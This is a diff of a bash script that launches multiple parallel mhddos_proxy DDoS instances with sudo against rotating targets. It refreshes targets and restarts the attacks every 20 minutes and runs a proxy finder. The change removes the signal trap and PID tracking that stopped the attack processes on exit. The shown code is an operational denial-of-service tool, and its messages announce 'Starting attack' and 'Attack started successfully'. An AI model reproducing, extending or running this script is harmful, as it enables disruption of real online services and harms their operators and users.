@@ -78,26 +78,6 @@ fi
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
 sleep 5s
 
-trap 'echo signal received!; ctrl_c' SIGINT SIGTERM
-
-function ctrl_c() {
-        echo "Exiting..."
-  	sleep 3s
-  	for i in ${PIDS[@]}; 
-  	do 	
-		echo "$i"
-    		sudo kill ${i} 
-  	done 
-  	for i in ${PIDS[@]};
-  	do 
-   		echo "$i"
-		wait ${i} 
-  	done
-  	exit
-	
-  	echo "Exiting failed - close the window with terminal!!!"
-  	sleep 60s
-}
 
 
 # Restarts attacks and update targets list every 20 minutes
@@ -167,9 +147,7 @@ do
 		
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
 	
-	declare -a PIDS
-	j=0
-      
+	
    	# Launch multiple mhddos_proxy instances with different targets.
    	for i in $random_numbers
    	do
@@ -183,10 +161,6 @@ do
             
             cd ~/mhddos_proxy
             sudo python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
-	    PID="$!"
-	    PIDS[j]=${PID}
-	    echo -e "\n${PIDS[j]}\n"
-	    j=$(( $j + 1 ))
 	    sleep 20s
 
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
@@ -198,9 +172,6 @@ do
 		
 	cd ~/proxy_finder
 	sudo python3 finder.py&
-	PID="$!"
-	PIDS[j]=${PID}
-	echo -e "\n${PIDS[j]}\n"
 	
 	sleep $restart_interval
 	clear
